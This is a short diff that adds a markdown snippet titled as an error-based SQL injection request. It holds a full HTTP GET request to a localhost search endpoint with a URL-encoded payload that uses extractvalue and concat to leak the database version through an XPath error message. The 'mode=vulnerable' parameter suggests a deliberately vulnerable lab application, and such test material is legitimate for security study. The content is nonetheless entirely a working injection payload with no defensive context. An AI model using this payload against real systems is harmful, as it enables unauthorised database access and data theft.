@@ -1,0 +1,6 @@
+### Error-based SQL Injection Request (ExtractValue XPath Leakage)
+GET /search?keyword=%27+AND+extractvalue(1%2C+concat(0x7e%2C+(SELECT+@@version)%2C+0x7e))+--+&category=ALL&mode=vulnerable HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Referer: http://localhost:8080/search.jsp
+Connection: keep-alive
